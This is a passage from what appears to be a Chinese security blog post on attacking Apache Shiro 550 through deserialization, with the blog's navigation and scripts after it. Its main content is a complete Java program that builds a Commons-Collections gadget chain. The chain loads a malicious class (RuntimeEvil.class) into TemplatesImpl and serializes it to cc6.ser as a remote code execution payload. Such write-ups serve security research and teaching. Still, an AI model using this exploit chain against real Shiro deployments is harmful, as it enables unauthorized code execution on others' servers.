+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shiroNoArrayCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;godown&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templatesClass);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        map.remove(templatesClass);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(factory, factory.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        factory.set(lazyMap, invokerTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line"><span class="comment">//        unserialize(&quot;cc6.ser&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806164241329.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806164241329.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/Shiro/" class="">
+              Shiro
+            </a>
+          
+        </div>
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>GodownKai</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2024/08/06/shiro-fan-xu-lie-hua-shen-ji/" target="_blank" title="Shiro550 URLDNS&amp;CC&amp;CB攻击">https://godownio.github.io/2024/08/06/shiro-fan-xu-lie-hua-shen-ji/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B897.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B897.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+    </div>
+    <a href="/2024/09/18/jdk7u21-jdk8u20-yuan-sheng-unserialize/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> 上一篇:
+        <div class="title-text">7u21&amp;8u20反序列化</div>
+      </div>
+      
+      <!-- <div class="content">
+        仅需JDK在指定版本，有反序列化入口，但无需其他的依赖包比如CC，CB能否直接打入反序列化？
+其中一个答案就是java原
+      </div> -->
+    </a>
+  </div>
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B895.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B895.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+    </div>
+    <a href="/2024/08/02/ctf-kuai-su-cha-ban/" class="post-nav-link">
+      <div class="title">
+        下一篇: <i class="fas fa-angle-right"></i>
+        <div class="title-text">CTF 快速查ban</div>
+      </div>
+      <!-- <div class="content">
+        ctf平台ctf复现：https://gz.imxbt.cn/account/login
+Common-Collecti
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-show="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-show="visible">
+      <div class="donate-box_close">
+        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          慧眼识珠牢弟
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
+          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
+          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
+</script>
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <aside id='l_side'>
+  
+    
+      <section class="widget side_blogger">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box rectangle' href='/about/'>
+          <img src='https://pic2.zhimg.com/80/v2-42b72d5ebee4b8d8aa70d9687effe87b_1440w.webp'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+          <h2>Godown_blog</h2>
+        
+        
+          <p>something for nothing</p>
+
+        
+        
+          <p><span id="jinrishici-sentence">Godown_blog</span></p>
+          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="mailto:me@xxx.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/godownio"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=1958304602"
+              class="social fab fa-qq flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+    
+  
+  
+  
+
+  <div class="layout_sticky">    
+    
+      
+<section class="widget side_toc">
+  
+
+  <div class='content'>
+    <div class="toc-main">
+      <div class="toc-content">
+        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro550"><span class="toc-text">Shiro550</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%9A"><span class="toc-text">环境搭建：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS"><span class="toc-text">URLDNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-collections"><span class="toc-text">Commons-collections</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC%E9%93%BE"><span class="toc-text">CC链</span></a></li></ol></li></ol> -->
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- 手机端目录按钮 -->
+<div id="toc-mobile-btn">
+  <i class="fas fa-list-ul" aria-hidden="true"></i>
+</div>
+
+      
+  <section class="widget side_recent_post">
+    
+  <header>
+    
+      <a style="color: " href='/tags/'><i class="fas fa-book fa-fw" aria-hidden="true"></i><span class='name'>最新文章</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      
+      <!-- hash算法 -->
+      
+      <div class="aside-list">
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/12/30/hibernate-fan-xu-lie-hua/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8185.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8185.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">12-30</span>
+                
+              </div>
+              <a class="post-title" href="/2025/12/30/hibernate-fan-xu-lie-hua/">hibernate反序列化</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/12/25/chun-qiu-yun-jing-spoofing/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8184.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8184.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">12-25</span>
+                
+              </div>
+              <a class="post-title" href="/2025/12/25/chun-qiu-yun-jing-spoofing/">春秋云镜 Spoofing</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/12/23/oddfuzz/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8183.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8183.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">12-23</span>
+                
+              </div>
+              <a class="post-title" href="/2025/12/23/oddfuzz/">ODDFUZZ</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/12/18/chun-qiu-yun-jing-flarum/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8182.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8182.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">12-18</span>
+                
+              </div>
+              <a class="post-title" href="/2025/12/18/chun-qiu-yun-jing-flarum/">春秋云镜 Flarum</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/12/18/chun-qiu-yun-jing-delegation/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8181.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8181.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">12-18</span>
+                
+              </div>
+              <a class="post-title" href="/2025/12/18/chun-qiu-yun-jing-delegation/">春秋云镜 Delegation</a>
+            </div>
+          </div>
+        
+      </div>
+    </div>
+  </section>
+
+    
+  </div>
+</aside>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  
+    <!-- 底部鱼儿跳动效果，依赖于jquery-->
+<div id="j-fish-skip" style=" position: relative;height: 153px;width: auto;"></div>
+<script>
+  var RENDERER = {
+    POINT_INTERVAL: 5,
+    FISH_COUNT: 3,
+    MAX_INTERVAL_COUNT: 50,
+    INIT_HEIGHT_RATE: .5,
+    THRESHOLD: 50,
+    FISH_COLOR: '',
+    init: function () {
+      this.setFishColor(); this.setParameters(), this.reconstructMethods(), this.setup(), this.bindEvent(), this.render()
+    },
+    setFishColor: function () {
+      let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+      if (isDark) {
+        this.FISH_COLOR = '#222'; // 暗黑色，有时间把这整成一个变量
+      } else {
+        this.FISH_COLOR = '' || 'rgba(66, 185, 133, 0.8)';
+      }
+    },
+    setParameters: function () {
+      this.$window = $(window), this.$container = $("#j-fish-skip"), this.$canvas = $("<canvas />"), this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d"), this.points = [], this.fishes = [], this.watchIds = []
+    },
+    createSurfacePoints: function () {
+      var t = Math.round(this.width / this.POINT_INTERVAL);
+      this.pointInterval = this.width / (t - 1), this.points.push(new SURFACE_POINT(this, 0));
+      for (var i = 1; i < t; i++) {
+        var e = new SURFACE_POINT(this, i * this.pointInterval),
+          h = this.points[i - 1];
+        e.setPreviousPoint(h), h.setNextPoint(e), this.points.push(e)
+      }
+    },
+    reconstructMethods: function () {
+      this.watchWindowSize = this.watchWindowSize.bind(this), this.jdugeToStopResize = this.jdugeToStopResize.bind(this), this.startEpicenter = this.startEpicenter.bind(this), this.moveEpicenter = this.moveEpicenter.bind(this), this.reverseVertical = this.reverseVertical.bind(this), this.render = this.render.bind(this)
+    },
+    setup: function () {
